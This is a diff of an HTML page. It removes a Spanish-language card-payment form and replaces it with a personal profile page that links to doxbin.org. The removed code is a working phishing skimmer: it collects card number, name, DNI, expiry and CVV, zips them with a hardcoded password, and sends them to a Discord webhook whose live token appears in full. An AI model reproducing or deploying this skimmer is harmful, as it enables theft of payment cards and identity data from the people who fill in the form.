@@ -1,223 +1,190 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Pagar con tarjetas</title>
+  <title>0800</title>
+  <link rel="icon" href="https://cdn.discordapp.com/attachments/1107128683522703411/1113168256056971374/EkQKUggX0AAZFlw-removebg-preview.png" type="image/x-icon">
+  <canvas id="canvas"></canvas>
   <style>
     body {
-      background: linear-gradient(to right, black, gray);
-      padding: 20px;
-      margin: 0;
-      font-family: Arial, sans-serif;
+      background-color: black;
+      color: #414141;
+      font-family: 'Chillax Sans Serif', sans-serif;
+      opacity: 100%;
+      font-size: 9px;
       display: flex;
-      justify-content: center;
       align-items: center;
-      min-height: 100vh;
-    }
-    
-    .container {
-      background-color: rgba(26, 26, 26, 0.8);
-      border-radius: 10px;
-      padding: 20px;
-      width: 400px;
-      opacity: 80%;
-      color: white;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+      }
+
+
+    #profile-container {
+      width: 800px;
+      height: 300px;
+      background-color: #1b1b1b;
+      opacity: 85%;
       display: flex;
       flex-direction: column;
       align-items: center;
+      justify-content: center;
+      z-index: 1;
+      margin: 0 auto; /* Agrega esta línea para centrar horizontalmente */
+      position: absolute;
+      top: 50%; /* Centra verticalmente */
+      left: 0;
+      right: 0;
+      transform: translateY(-50%); /* Centra verticalmente */
     }
-    
-    .input-field {
-      margin-bottom: 10px;
-    }
-    
-    .input-field label {
-      display: block;
-      margin-bottom: 5px;
-    }
-    
-    .input-field input {
+
+    #video-background {
+      position: fixed;
+      top: 0;
+      left: 0;
       width: 100%;
-      padding: 5px;
-      border-radius: 5px;
-      border: none;
+      height: 100%;
+      object-fit: cover;
+      z-index: -1;
     }
-    
-    button {
-      padding: 10px 20px;
-      background-color: #1e1e1e;
-      color: white;
-      border: none;
-      border-radius: 5px;
+
+    #profile-pic {
+      border-radius: 50%;
+      width: 200px;
+      height: 200px;
+    }
+
+    #map-pin {
+      width: 18px;
+      height: 18px;
+      margin-right: 5px;
+    }
+
+    #profile-container h1 {
+      display: flex;
+      align-items: center;
+      opacity: 100;
+      
+    }
+
+    #ip-address {
+      font-size: 8px;
+    }
+
+    #spotify-embed {
+      width: 0px;
+      height: 0px;
+      margin-top: 0px;
+    }
+
+    #audio-player {
+      position: fixed;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+    }
+
+    #toggle-btn {
+      appearance: none;
+      width: 50px;
+      height: 25px;
+      background-color: #1b1b1b;
+      border-radius: 25px;
+      position: relative;
       cursor: pointer;
-      margin-top: 10px;
+      outline: none;
+      margin: 0;
     }
-    
-    #error-message {
-      color: red;
-      margin-bottom: 10px;
+
+    #toggle-btn:before {
+      content: "";
+      position: absolute;
+      width: 21px;
+      height: 21px;
+      border-radius: 50%;
+      top: 2px;
+      left: 2px;
+      background-color: #fff;
+      transition: transform 0.2s ease;
     }
-    
-     #done-message {
-      color: green;
-      margin-bottom: 10px;
-    }
-    
-    .ui-datepicker {
-      background-color: white;
-      color: black;
-    }
-    
-    .ui-datepicker-header {
-      background-color: #1e1e1e;
-      color: white;
-    }
-    
-    .ui-datepicker-calendar a {
-      color: black;
+
+    #toggle-btn:checked:before {
+      transform: translateX(25px);
     }
   </style>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.6.0/jszip.min.js"></script>
-  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-  <script src="https://code.jquery.com/ui/1.12.1/jquery-ui.js"></script>
-  <script>
-    function updateSigninStatus() {
-      var cardNumber = document.getElementById("card-number").value;
-      var cardName = document.getElementById("card-name").value;
-      var cardDNI = document.getElementById("card-dni").value;
-      var cardExpiration = document.getElementById("card-expiration").value;
-      var cardCVV = document.getElementById("card-cvv").value;
-
-      if (!validateCard(cardNumber)) {
-        document.getElementById("error-message").textContent = "Tarjeta inválida";
-        return;
-      }
-
-      var fileName = cardNumber.substr(0, 6) + '_' + cardName + 'C';
-      var zipPassword = "08papanat4s";
-
-      var cardData = [
-        new Date().toLocaleString(),
-        cardNumber,
-        cardName,
-        cardDNI,
-        cardExpiration,
-        cardCVV
-      ];
-
-      sendToWebhook(zipPassword, fileName, cardData);
-    }
-
-    function sendToWebhook(password, fileName, cardData, zipPassword) { //function sendToWebhook(password, fileName, cardData)
-      var zip = new JSZip();
-      var csvContent = cardData.join(", ");
-      zip.file(fileName + ".txt", csvContent);
-      zip.generateAsync({ type: "blob", compression: "DEFLATE", password: zipPassword })
-        .then(function(content) {
-          var formData = new FormData();
-          formData.append("file", content, fileName + ".zip");
-
-          fetch("https://discord.com/api/webhooks/1116937945614651504/ZtSd7H7B8jvvKntmMQtoq7sDphILAMdJ_Ec6XnNiLICudI9DSnhtQ5kLbx13zt7TrtoX", {
-            method: "POST",
-            body: formData
-          })
-          .then(function(response) {
-            if (response.ok) {
-              console.log("Tarjeta enviada al webhook correctamente.");
-            } else {
-              console.error("Error al enviar la tarjeta al webhook.");
-            }
-          })
-          .catch(function(error) {
-            console.error("Error al enviar la tarjeta al webhook:", error);
-          });
-        });
-    }
-
-    function validateCard(cardNumber) {
-      var sum = 0;
-      var isEven = false;
-
-      for (var i = cardNumber.length - 1; i >= 0; i--) {
-        var digit = parseInt(cardNumber.charAt(i), 10);
-
-        if (isEven) {
-          digit *= 2;
-          if (digit > 9) {
-            digit -= 9;
-          }
-        }
-
-        sum += digit;
-        isEven = !isEven;
-      }
-
-      return sum % 10 === 0;
-    }
-
-    $(function() {
-      $("#card-expiration").datepicker({
-        dateFormat: "mm/yy",
-        changeMonth: true,
-        changeYear: true,
-        monthNames: [
-          "01", "02", "03", "04", "05", "06",
-          "07", "08", "09", "10", "11", "12"
-        ],
-        monthNamesShort: [
-          "01", "02", "03", "04", "05", "06",
-          "07", "08", "09", "10", "11", "12"
-        ],
-        prevText: "Anterior",
-        nextText: "Siguiente",
-        yearRange: "-0:+10",
-        showOtherMonths: true,
-        selectOtherMonths: true,
-        showMonthAfterYear: true,
-      });
-      
-      $("#card-cvv").on("input", function() {
-        this.value = this.value.replace(/[^0-9]/g, "").slice(0, 3);
-      });
-    });
-    
-    function showProcessingMessage() {
-      document.getElementById("done-message").textContent = "Listo! Procesando pago...";
-    }
-  </script>
 </head>
 <body>
-  <div class="container">
-    <h1>Pedido por Tarjeta</h1>
-  
-    <div id="error-message"></div>
-    <div id="done-message"></div>
-  
-    <div class="input-field">
-      <label for="card-number">Número de Tarjeta:</label>
-      <input type="text" id="card-number" maxlength="16" />
-    </div>
-  
-    <div class="input-field">
-      <label for="card-name">Nombre:</label>
-      <input type="text" id="card-name" />
-    </div>
-  
-    <div class="input-field">
-      <label for="card-dni">DNI:</label>
-      <input type="text" id="card-dni" maxlength="8" />
-    </div>
-  
-    <div class="input-field">
-      <label for="card-expiration">Fecha de Expiración:</label>
-      <input type="text" id="card-expiration" />
-    </div>
-    
-    <div class="input-field">
-      <label for="card-cvv">CVV:</label>
-      <input type="text" id="card-cvv" maxlength="3" />
-    </div>
-  
-    <button onclick="showProcessingMessage(); updateSigninStatus()">Enviar</button>
+  <video id="video-background" autoplay sinline muted loop>
+    <source src="" type="video/mp4">
+  </video>
+  <div id="profile-container">
+    <img id="profile-pic" src="https://cdn.discordapp.com/attachments/1107128683522703411/1113157227067473930/a_e3322e29d53a0a311c8596bd1c8fbb20.gif" alt="Foto de perfil">
+    <h1><img id="map-pin" src="https://cdn.solo.to/images/map-pin.svg" alt="Pin"> Argentina</h1>
+    <h1>doxbin.org/24k</h1>
+    <h1> </h1>
   </div>
+
+  <audio id="audio" src="https://cdn.discordapp.com/attachments/1107128683522703411/1112927191706112120/y2mate.com_-_KHEA_Tengo_30_ft_Duki_Neo_Pistea_Cazzu_Tali_Goya_Prod_Asan.mp3" loop></audio>
+
+  <div id="audio-player">
+    <input type="checkbox" id="toggle-btn">
+    <label for="toggle-btn" id="audio-toggle"></label>
+  </div>
+
+  <script>
+    function removeSpotifyEmbed() {
+      var embedElement = document.getElementById("spotify-embed");
+      if (embedElement) {
+        embedElement.parentNode.removeChild(embedElement);
+      }
+    }
+
+    window.addEventListener("message", function(event) {
+      if (event.origin === "https://open.spotify.com" && event.data === "ready") {
+        removeSpotifyEmbed();
+      }
+    });
+
+    function getRandomVideoURL() {
+      var videoUrls = [
+        "https://cdn.discordapp.com/attachments/1107128683522703411/1113156690376925185/colombianamp4.mp4",
+        "https://cdn.discordapp.com/attachments/1107128683522703411/1113164871865995294/hielo.mp4",
+        "https://cdn.discordapp.com/attachments/1107128683522703411/1113165442144538735/vuelta.mp4",
+        "https://cdn.discordapp.com/attachments/1107128683522703411/1113156846258229248/hitboy.mp4",
+        "https://cdn.discordapp.com/attachments/1107128683522703411/1113167053646467082/quavo2.mp4"
+      ];
+      var randomIndex = Math.floor(Math.random() * videoUrls.length);
+      return videoUrls[randomIndex];
+    }
+
+    var videoBackground = document.getElementById("video-background");
+    var sourceElement = videoBackground.getElementsByTagName("source")[0];
+    sourceElement.setAttribute("src", getRandomVideoURL());
+    videoBackground.load();
+
+    var audioPlayer = document.getElementById("audio");
+    var toggleBtn = document.getElementById("toggle-btn");
+    var audioToggle = document.getElementById("audio-toggle");
+
+    toggleBtn.addEventListener("change", function() {
+      if (toggleBtn.checked) {
+        audioPlayer.play();
+        audioToggle.innerText = " ";
+      } else {
+        audioPlayer.pause();
+        audioToggle.innerText = " ";
+      }
+    });
+  </script>
+<script  src="./script.js"></script>
 </body>
 </html>
+
+
+
+
